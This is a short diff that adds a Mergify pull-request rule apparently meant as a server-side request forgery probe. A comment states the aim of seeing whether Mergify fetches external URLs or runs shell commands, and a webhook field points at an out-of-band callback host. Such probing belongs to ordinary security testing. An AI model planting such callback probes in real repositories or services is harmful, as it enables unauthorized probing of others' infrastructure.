@@ -1,0 +1,10 @@
+pull_request_rules:
+  - name: Test SSRF
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "Test"
+      # We are trying to see if Mergify fetches external URLs or runs shell commands
+      # based on the YAML config.
+      webhook: "http://your-unique-id.oast.fun" 
